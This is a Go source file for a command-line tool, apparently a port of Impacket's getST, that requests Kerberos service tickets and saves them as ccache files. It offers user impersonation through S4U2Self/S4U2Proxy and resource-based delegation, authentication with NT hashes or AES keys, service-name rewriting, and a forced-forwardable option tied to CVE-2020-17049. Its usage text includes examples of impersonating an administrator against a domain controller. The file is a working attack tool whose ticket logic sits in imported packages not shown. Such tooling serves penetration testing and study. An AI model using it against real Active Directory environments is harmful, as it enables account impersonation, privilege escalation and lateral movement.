// SPDX-License-Identifier: Apache-2.0

package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"strings"

	"gopacket/pkg/flags"
	"gopacket/pkg/kerberos"
	"gopacket/pkg/session"
)

var (
	spn              = flag.String("spn", "", "SPN (service/server) of the target service the ticket will be generated for")
	altService       = flag.String("altservice", "", "New sname/SPN to set in the ticket")
	impersonate      = flag.String("impersonate", "", "Target username to impersonate (S4U2Self)")
	additionalTicket = flag.String("additional-ticket", "", "Forwardable service ticket ccache for S4U2Proxy (RBCD)")
	selfOnly         = flag.Bool("self", false, "Only do S4U2self, no S4U2proxy")
	forceForwardable = flag.Bool("force-forwardable", false, "Force the S4U2Self ticket to be forwardable (CVE-2020-17049)")
	u2u              = flag.Bool("u2u", false, "Request User-to-User ticket")
	renew            = flag.Bool("renew", false, "Sets the RENEW ticket option to renew the TGT used for authentication. Set -spn to 'krbtgt/DOMAINFQDN'")
)

func main() {
	opts := flags.Parse()

	if opts.TargetStr == "" {
		flagUsage()
		os.Exit(1)
	}

	target, creds, err := session.ParseTargetString(opts.TargetStr)
	if err != nil {
		log.Fatalf("[-] Error parsing target string: %v", err)
	}

	opts.ApplyToSession(&target, &creds)

	if creds.Domain == "" {
		log.Fatalf("[-] Domain is required (specify as domain/user[:pass]@target)")
	}

	if creds.Username == "" {
		log.Fatalf("[-] Username is required")
	}

	// Validate flags
	if !*selfOnly && *spn == "" {
		log.Fatalf("[-] -spn is required (unless using -self)")
	}

	if *selfOnly && *impersonate == "" {
		log.Fatalf("[-] -impersonate is required when using -self")
	}

	if *additionalTicket != "" && *impersonate == "" {
		log.Fatalf("[-] -impersonate is required when using -additional-ticket")
	}

	// Determine authentication method
	password := creds.Password
	ntHash := creds.Hash
	aesKey := creds.AESKey

	if password == "" && ntHash == "" && aesKey == "" && !opts.NoPass && !opts.Kerberos {
		if err := session.EnsurePassword(&creds); err != nil {
			log.Fatal(err)
		}
		password = creds.Password
	}

	// Determine KDC address
	dcIP := creds.DCIP
	dcHost := creds.DCHost
	if dcIP == "" && dcHost == "" {
		if target.Host != "" {
			dcIP = target.Host
		}
	}

	req := &kerberos.STRequest{
		Username:         creds.Username,
		Password:         password,
		Domain:           creds.Domain,
		NTHash:           ntHash,
		AESKey:           aesKey,
		DCIP:             dcIP,
		DCHost:           dcHost,
		SPN:              *spn,
		Impersonate:      *impersonate,
		AdditionalTicket: *additionalTicket,
		AltService:       *altService,
		SelfOnly:         *selfOnly,
		ForceForwardable: *forceForwardable,
		U2U:              *u2u,
		Renew:            *renew,
	}

	if *impersonate != "" {
		fmt.Printf("[*] Impersonating %s\n", *impersonate)
	} else {
		fmt.Printf("[*] Getting ST for user\n")
	}

	result, err := kerberos.GetST(req)
	if err != nil {
		if strings.Contains(err.Error(), "KDC_ERR_S_PRINCIPAL_UNKNOWN") {
			log.Fatalf("[-] %v\n[-] Probably user %s does not have constrained delegation permissions or impersonated user does not exist", err, creds.Username)
		}
		if strings.Contains(err.Error(), "KDC_ERR_BADOPTION") {
			log.Fatalf("[-] %v\n[-] Probably SPN is not allowed to delegate by user %s or initial TGT not forwardable", err, creds.Username)
		}
		log.Fatalf("[-] %v", err)
	}

	// Apply -altservice if specified
	if *altService != "" {
		if err := kerberos.AlterServiceName(result, *altService); err != nil {
			log.Fatalf("[-] Failed to alter service name: %v", err)
		}
	}

	// Determine output filename
	var outFile string
	if *impersonate != "" {
		outFile = *impersonate
	} else {
		outFile = creds.Username
	}

	// Add service info to filename
	if *altService != "" {
		svc := strings.ReplaceAll(*altService, "/", "_")
		outFile += "@" + svc
	} else if *spn != "" {
		svc := strings.ReplaceAll(*spn, "/", "_")
		outFile += "@" + svc
	}
	outFile += ".ccache"

	if opts.OutputFile != "" {
		outFile = opts.OutputFile
	}

	if err := kerberos.SaveST(outFile, result); err != nil {
		log.Fatalf("[-] Failed to save ticket: %v", err)
	}

	fmt.Printf("[*] Saving ticket in %s\n", outFile)
}

func flagUsage() {
	fmt.Fprintf(os.Stderr, "Usage: getST [options] [domain/]username[:password]\n")
	fmt.Fprintf(os.Stderr, "\nGiven a password, hash or aesKey, it will request a Service Ticket and save it as ccache\n")
	fmt.Fprintf(os.Stderr, "\nExamples:\n")
	fmt.Fprintf(os.Stderr, "  getST -spn cifs/dc.domain.local -dc-ip 10.0.0.1 domain.local/user:pass\n")
	fmt.Fprintf(os.Stderr, "  getST -spn cifs/dc.domain.local -hashes :nthash domain.local/user\n")
	fmt.Fprintf(os.Stderr, "  getST -spn cifs/dc.domain.local -impersonate admin domain.local/svc_user:pass\n")
	fmt.Fprintf(os.Stderr, "  getST -spn cifs/dc.domain.local -impersonate admin -additional-ticket svc.ccache domain.local/svc_user:pass\n")
}
